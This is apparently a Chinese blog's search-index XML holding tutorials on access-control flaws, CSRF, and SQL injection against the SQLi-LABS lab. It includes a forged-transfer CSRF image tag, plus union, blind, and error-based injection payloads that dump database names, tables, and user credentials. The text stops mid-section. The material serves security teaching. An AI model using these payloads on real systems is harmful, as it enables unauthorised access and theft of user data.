<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逻辑越权介绍</title>
      <link href="/2022/01/15/luo-ji-yue-quan/"/>
      <url>/2022/01/15/luo-ji-yue-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑漏洞-越权介绍"><a href="#逻辑漏洞-越权介绍" class="headerlink" title="逻辑漏洞-越权介绍"></a>逻辑漏洞-越权介绍</h1><p>越权：越-&gt;超越；权-&gt;权限</p><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>​    获取到同一级别其他用户的权限</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>获取到不同级别的使用者的权限</p><ul><li>向上越权-&gt;下级获得上级权限</li><li>向下越权-&gt;上级获得下级(隐私)权限</li></ul><p><strong>eg</strong>：一个网站、管理员admin，可以增添用户、删除用户…</p><p>​        用户:user-1,user-2…可发布公开内容，隐私内容等等。</p><p><strong>水平越权</strong>：user-1拿到user-2的权限，可查看user-2发布的隐私内容，以user-2的身份进行一些非法操作。</p><p><strong>垂直越权</strong>：</p><p>向上越权：user-1拿到admin的权限，非法进行增删用户等操作。</p><p>向下越权：admin拿到user-1或user-2的权限，进行非法查看隐私内容等操作</p><h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p>1、请求中不存在参数，只用cookie进行身份验证，则不可越权；</p><p>2、请求中存在参数，且参数中的某些值可能是辨识用户身份的<strong>唯一</strong>值如employeeID、departmentID、ID等。</p><p><strong>水平越权</strong>：用两个浏览器同时注册user-1，user-2两个普通用户。在相同界面同时进行抓包对比，寻找代表其身份的参数，修改参数进行重放，若访问成果，则存在水平越权。</p><p><strong>垂直越权</strong>：</p><p>以向上越权为例：抓包寻找辨识用户身份的唯一值，替换为管理员的参数，进行重放，若访问成功，则存在垂直越权。</p><p><strong>问题：</strong>如何寻找代表管理员的身份唯一值？</p><p>1、若该值为有规律数字可进行枚举。2、可在站点寻找是否有可利用信息进行构造。3、下载站点源代码进行本地搭建、注册管理员账户进行测试。</p><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>可用burpsuite 插件authz进行测试验证。</p><h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>执行关键操作时验证用户身份，判断其是否具有操作权限。</p><p>对标识用户唯一身份的参数进行加密，防止用户进行枚举。</p><p>服务器对每个页面链接进行权限判断。</p><p>用户登录后不再以客户端用户提交的登录信息作为依据，而是以会话中服务端存在的已登陆用户信息为准。</p><p>最小权原则。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞介绍</title>
      <link href="/2022/01/15/csrf/"/>
      <url>/2022/01/15/csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><p>CSRF（Cross-site request forgery），跨站请求伪造。</p><p>​    攻击者盗用了你的身份，以你的名义对服务器进行请求（请求伪造），服务器误以为这个请求是由你来进行发送的。导致攻击者成功的完成了他的非法操作。如：修改密码，非法转账等。（危害取决于你的权限有多大）</p><h2 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h2><ul><li><p>GET</p></li><li><p>POST</p><p>对于CSRF来说，GET、POST是没有任何区别的，只是POST请求方式多了一些代码。</p></li></ul><h2 id="CSRF漏洞利用过程："><a href="#CSRF漏洞利用过程：" class="headerlink" title="CSRF漏洞利用过程："></a>CSRF漏洞利用过程：</h2><!--本故事纯属虚构，重在理解利用过程--><p>1、<strong>小胖</strong>在银行有一笔巨款，这天他登陆了这个银行的网站准备将这笔巨款转给他的爸爸<strong>Jaa</strong>。假设转账url地址为<code>http://www.xxxbank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=Jaa</code></p><p>2、在<strong>小胖</strong>将要转账时，看到了一个带有诱惑的图片，已登陆银行网站的<strong>小胖</strong>因抵制力不足，点击了这张图片。（该图为黑客<strong>zsan</strong>构造的恶意链接，<code>&lt;img src=&quot;http://www.xxxbank.com/withdraw?account=xiaopang&amp;amount=1000&amp;for=zsan&quot;&gt;)</code></p><p>3、而在服务器看来这是一次正常的请求，即<strong>小胖</strong>给<strong>zsan</strong>转账1000元，小胖白白损失了这笔巨款。</p><p>漏洞利用前提：</p><p>1、登录受信任网站A、并在本地生成cookie。</p><p>2、在没有登出的情况下，访问恶意网站B。</p><h2 id="检测CSRF漏洞"><a href="#检测CSRF漏洞" class="headerlink" title="检测CSRF漏洞"></a>检测CSRF漏洞</h2><p>​    注册合法用户，确认该用户可执行哪些敏感操作如：修改密码、修改删除敏感信息、发表留言、转账等。</p><p>确认敏感操作后，构造CSRF POC进行修改。（劫持用户操作）</p><!--Burp Suite提供了CSRF POC的构造方法--><p>可在敏感操作处使用<strong>Burp Suite</strong>进行抓包、右键选择<strong>Engagement tools</strong> – <strong>Generate CSRF PoC</strong>来伪造请求。</p><h2 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h2><p>1、二次确认</p><p>​    在进行敏感操作时对用户身份进行二次确认，如再次输入密码。或在敏感操作时要求用户输入验证码。</p><p>2、验证HTTP Referer字段</p><p>​    在HTTP协议中，Referer字段记录了该HTTP请求的来源地址。当用户通过黑客的地址向网站发送请求时，该请求的Referer字段指向的是黑客的地址，所以只要对每一个敏感请求验证他的来源地址是否与合法请求者为同一个地址，便可判断是否为合法请求。然而这种方法并非完全可靠，攻击者往往可以通过二次抓包伪造referer值来绕过验证。</p><p>3、 Token认证</p><p>​    Token 是在服务端产生的。当用户成功登录信息后，服务端返产生Token随机值给分配给用户，并同时存储在Session中，当用户访问某些界面时，该值会直接传递在用户界面或者Cookie中。当用户提交请求时，该Token值也会随之提交，服务器收到数据后，会判断该值是否与Session中存储的一致。若一致，则为合法请求，否则可能是CSRF攻击。</p><p>补充：若为GET请求，则考虑使用在Cookie中存储Token。</p><p>​    当网站同时存在XSS、CSRF漏洞时，Token防御机制会失效，攻击者可通过JavaScript获取Tocen值。因此，当网站存在XSS时，使用Token防范CSRF是没有任何意义的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞介绍</title>
      <link href="/2022/01/15/sql-zhu-ru-lou-dong-jie-shao/"/>
      <url>/2022/01/15/sql-zhu-ru-lou-dong-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入漏洞介绍"><a href="#SQL注入漏洞介绍" class="headerlink" title="SQL注入漏洞介绍"></a>SQL注入漏洞介绍</h1><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p><strong>原理：</strong></p><ul><li><p>Sql注入，由于Web应用程序对用户输入数据的合法性没有判断和过滤，导致后台SQL语句拼接了用户的输入。用户可以通过构造不同的Sql语句来实现对数据库的任意操作。（如：增删改查）。</p><p>解释：当我们用户在前端浏览器页面做一些事情的时候，当需要与数据库进行交互时，比如最简单的登陆账号，web应用程序接收到我们账号密码后，需要后台有这样一个数据库的命令，去查询数据库中是否有这样的一个账号密码与之对应，然后做出判断：是否存在用户名，若存在，用户名与密码是否相匹配。然而，当数据库的这个命令直接被用户去操控，用户直接对数据库进行任意操作。这样所带来的隐患是极其严重的。我们称之为存在SQL注入漏洞。</p></li></ul><p><strong>起因：</strong></p><p>为什么会有SQL注入？</p><ul><li>代码对带入SQL语句的参数过滤不严格</li><li>未启用框架的安全配置，例如：PHP的magic_quotes_gpc</li><li>未使用框架安全的查询方法</li><li>测试接口未删除</li><li>未启用防火墙</li><li>未使用其他的安全防护设备</li><li>… …</li></ul><p><strong>危害 ：</strong></p><p>这些危害包括但不局限于:</p><ul><li>数据库信息泄漏:数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改:通过操作数据库对特定网页进行篡改。</li><li>网站被挂马。传播恶意软件:修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作。数据库服务器被攻击。数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控“制操作系统。</li><li>破坏读盘数据,瘫痪全系统。 一些类型的数据库系统能够让Sql指令操作文件系统，这使得Sql注入的危害被进一步放大。</li><li>……</li></ul><p><strong>场景：</strong></p><p>哪些地方可能会存在SQL注入？</p><pre><code>        所有与数据库进行交互的地方：</code></pre><ul><li>登陆框</li><li>搜索框</li><li>详情页</li><li>提交按钮</li><li>… …</li></ul><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>以下所有内容除特殊强调外数据库均为Mysql</strong></p><p>先来了解一下Mysql的一些基础结构把</p><p>数据库:information_schema(存放数据库元信息) </p><p>其中三张常用的表 </p><ul><li>schemata (存放数据库名) </li><li>tables    (存放表名)</li><li> columns(存放字段名)</li></ul><p>schemata表： </p><ul><li>schema_name字段用来存储数据库名 </li></ul><p>tables表： </p><ul><li>table_schema(数据库名) </li><li>table_name(表名)</li></ul><p> columns表： </p><ul><li>table_schema(数据库名) </li><li>table_name(表名) </li><li>column_name(字段名)</li></ul><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>SQL注入的类型很多，但不是严格的进行区分的。如<strong>报错注入</strong>可发生在GET型注入中，也可发生在POST型注入中，以下列举几种常见的分类：</p><p>按照请求方法分类</p><ul><li>GET型注入</li><li>POST型注入</li></ul><p>按照SQL数据类型分类</p><ul><li>整型注入</li><li>字符型注入</li></ul><p>其他类型</p><ul><li>报错注入</li><li>布尔盲注</li><li>时间盲注</li><li>Cookie注入</li><li>User-Agent注入</li><li>… …</li></ul><h2 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h2><pre><code>当我们在进行SQL注入时，首先要判断他的注入点。其目的便是尽可能地使数据库去执行我们的输入：</code></pre><ul><li>单引号’、双引号”、单括号）、双括号））等看看是否报错，如果报错就<strong>可能</strong>存在SQL注入漏洞了。</li><li>在url后加and 1=1 、and 1=2、 -0、 +0、 .0、 .1等查看页面回显是否一样来判断所输入的数据是否被当作数据库命令执行。（部分注入存在回显不明显，可通过审查元素或者使用BurpSuite进行查看）</li></ul><h2 id="下面我们用SQLi-LABS-为实验环境进行展开分析"><a href="#下面我们用SQLi-LABS-为实验环境进行展开分析" class="headerlink" title="下面我们用SQLi-LABS 为实验环境进行展开分析"></a><strong>下面我们用SQLi-LABS 为实验环境进行展开分析</strong></h2><h2 id="1、联合查询"><a href="#1、联合查询" class="headerlink" title="1、联合查询"></a>1、联合查询</h2><h3 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h3><p><img src="https://img-blog.csdnimg.cn/20210204153118535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>在url后输入?id=1</li><li>通过不断切换id的值我们发现页面会转换为不同的内容</li><li>当在数字后加入单引号时：?id=1’，我们发现页面有报错信息（此时可能存在sql注入。根据报错信息我们可以分析出错的地方在单引号 ‘ ）</li><li>继续输入and 1=1 发现页面没有变化 输入and 1=2 页面发生了变化（此时可以确定我们的输入已经被执行，该处存在SQL注入漏洞）接下来我们要进一步获取信息</li><li>通过order by 后加数字来判断有多少个字段若 order by 2返回正常 则说明字段数大于等于2。由该处 order by 3正常 order by 4返回错误可判断字段数为3</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过union select 联合查询 使用占位数字列出当前字段（要想输入占位符生效须使前面的条件否定 可使用and 1=2 或 id=-1）</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2 union select 1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153158773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>使用函数version(),database()替换占位数字回显出数据库<strong>版本信息</strong>和<strong>名称</strong> </li></ul><p><img src="https://img-blog.csdnimg.cn/20210204153222162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>之后我们可以通过union select 进一步获取信息</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(schema_name),3 from  information_schema.schemata获取所有数据库<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153252420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema&#x3D;&#39;security&#39;获取当前数据库&#39;security&#39;所有的表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415330714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; 获取users表的所有字段<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415331879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们知道了users表的存在，又知道表中有 id ，username， password三列，那么我们可以查询他的内容了</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(id,&#39;-&#39;,username,&#39;-&#39;,password),3 from users <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153341749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><pre><code>在我们常见的数据库语句中，大多数参数会被一些符号（单引号，双引号、括号等的）进行包裹。例如这条语句：</code></pre><pre class="line-numbers language-none"><code class="language-none">$query&#x3D;&quot;select first_name from users where id&#x3D;&#39;$_GET[&#39;id&#39;]&#39;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>可以看到参数被单引号包裹着如果此时我们输入</code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 union select database();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>则在数据库中是这样子的</code></pre><pre class="line-numbers language-none"><code class="language-none">select first_name from users where id&#x3D;&#39;1 union select database()&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>然而我们并没有id值等于1 union select database()  显然这样是无效的因此我们可以这样输入</code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; union select database() #;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>我们用单引号 &#39; 来闭合前边的内容，用#注释掉后边的内容。（若#注释失败可以使用 --+ 来注释 或者 --空格）这样在数据库中的    语句为：</code></pre><pre class="line-numbers language-none"><code class="language-none">select first_name from users where id&#x3D;&#39;1&#39; union select database()  #&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>这样的话便可以顺利的进行下一步的注入。（除了这点区别外其他步骤可以参照**整型注入**）我们来看一下都有哪些类型的字符型注入。</code></pre><ul><li>单引号包裹</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153417521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>单引号+括号包裹</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153429543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>双引号＋括号包裹</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-4&#x2F;?id&#x3D;-1&quot; )union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153440942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2、盲注"><a href="#2、盲注" class="headerlink" title="2、盲注"></a>2、盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>当页面返回信息没有报错,或者没有返回一些数据的时候,我们可以通过页面状态发生的变化来判断字符的数据。</p><p>布尔盲注，则根据布尔类型的数据（真或假）来判断后台的数据。</p><p>如：SQLi-LABS-less5</p><p>在此之前我们需要认识一些函数：</p><ul><li>substr(string,start,length)             //substr截取字符串三个参数分别为：被截取的字符串，截取字符串起始的位置，截取字符串的偏移量 如：substr(hello,2,3 )则返回：ell                                        （<strong>注意：substr截取从1开始</strong>）</li><li>ascii()</li><li>count()                                              //列出列名数量</li><li>length()                                            //返回长度</li><li>concat(‘’,’’)                                        //字符串拼接，参数也可为变量</li><li>limit m,n                                          //从m行开始，到m+n行                                              （<strong>注意：limit截取从0开始</strong>）</li></ul><p>我们按照之前的方法：当我们在url后输入?id=1的时候可以看到界面出现了You are in…….. 如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20210204153528529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>当加上单引号之后，我们看到了页面报错。</p><p><img src="https://img-blog.csdnimg.cn/20210204153548892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>我们在末尾加上–+之后，发现页面返回了正常。（You are in…….. ）</p><p><img src="https://img-blog.csdnimg.cn/20210204153559817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>由之前学习的知识我们可以知道，这是一个参数由单引号包裹的字符型注入。</p><p>然而我们当我们继续查询下去的时候会发现：当我们输入不同的语句时，页面只会返回两种状态：</p><ul><li>当输入语句为真时，会出现如上图的  You are in…….. </li><li>当输入的语句为假时，则不会出现   You are in……..  如下图所示：</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153610566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>很显然You are in…….. 的出现，代表着结果为真，否则代表着结果为假。</p><p>那么，我们该如何继续查询更多的信息呢？</p><p>我们不妨输入这样的语句进行查询：</p><ul><li>查询version()第一个字符。是否为b</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and substr(version(),1,1)&#x3D; &#39;b&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到返回结果为假。然而这样查询的弊端是显而易见的：光英文字母区分大小写便有52个字符，再加上其他字符，显然会耗费大量的精力。</p><p>我们引入另一个函数<strong>ascii()</strong> ,将字符转换为码。(共128个字符)</p><p>那么我们可以这样查询：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&gt; 100--+         假http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&gt; 50--+          真http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&gt; 60--+          假...http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&#x3D; 53--+          真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153623681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>对照码表查看，53对应的是字符为数字5。这样我们可以知道version()值第一个字符为数字5。</p><p>我们继续进行查询：（以下内容省略了盲猜的过程）</p><ul><li>判断数据库长度</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8--+长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 依次确定数据库名称组成</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1))&#x3D; 115--+shttp:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),2,1))&#x3D; 101--+e...security<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>判断数据表的个数</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;0--+真...http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;4--+表的个数为4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>判断表的长度</li></ul><pre class="line-numbers language-none"><code class="language-none">and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;0--+&#x2F;&#x2F;判断第一张表的长度<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>……                                                              (接下来可照此法判断列名以及列中数据。)</li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当页面没有回回显内容时，即使输入错误的SQL语句页面也不会发生变化。此时我们应该考虑另外一种注入方式。即基于时间的延时盲注。</p><p>SQL语句与布尔盲注大致相同，所不同的是布尔条件以及无法使我们获得所需要的信息，因此我们引入了一个新的函数:</p><ul><li>sleep()                                                            //延时</li></ul><p>我们以SQLi-LABS-less9为例，相同的知识不再赘述直接输入以下语句。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(5) --+&#x2F;&#x2F;若条件为真则延时5秒<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到图示处出现了延时</p><p><img src="https://img-blog.csdnimg.cn/2021020415364245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>判断数据库长度：如果数据库长度为8则延迟5秒否则立即响应</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153652563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>可参考结合布尔盲注的SQL语句进行下一步查询，这里不再赘述。</strong></li></ul><h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>在联合查询中，我们根据报错信息来获取注入类型是整型还是字符型。接下来，我们要利用报错信息来获取一些更敏感的信息。（这里适用于页面没有显示位，但页面会有报错信息的显示）</p><h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><pre><code>EXTRACTVALUE (XML_document, XPath_string)</code></pre><ul><li><p>extractvalue()    //从目标xml中返回包含所查询的字符串</p></li><li><p>XML_document是strings格式，为 XML 文档对象的名称</p></li><li><p>XPath_string (Xpath 格式的字符串)</p></li></ul><p>我们依然用SQLi-LABS-less5进行演示：</p><ul><li><p>extractvalue的第一个参数我们任意写一个文档名称1；因为第二个参数须为Xpath格式字符串，我们写的</p><p>database()显然不符合要求，因此会产生报错。而我们就是利用这个报错点去寻找我们需要的敏感信息。</p><p>我们用concat连接‘~’与database()值。（Xpath语法如果想要深入了解可自行百度。）</p></li><li><p>暴数据库</p></li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153740297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>暴表名</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415375090.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>……</li></ul><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><pre><code>UPDATEXML (XML_document, XPath_string, new_value)</code></pre><ul><li>updatexml()            